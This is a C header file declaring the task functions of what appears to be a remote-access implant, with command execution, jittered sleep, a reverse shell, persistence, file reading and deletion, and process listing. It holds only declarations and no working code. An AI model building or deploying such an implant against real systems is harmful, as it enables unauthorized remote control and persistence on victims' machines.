#ifndef TASKS_H
#define TASKS_H

// Task function declarations
void task_execve(char *command_str, char *argument_str, const char *id_task);
void task_sleep(char *sleep_time_str, char *jitter_str);
void task_locate(const char *id_task);
void task_revshell(int server_port, const char *server_ip);
void task_persist();
void task_cat(char *file_path_str, const char *id_task);
void task_mv();
void task_rm();
void task_ps();

#endif // TASKS_H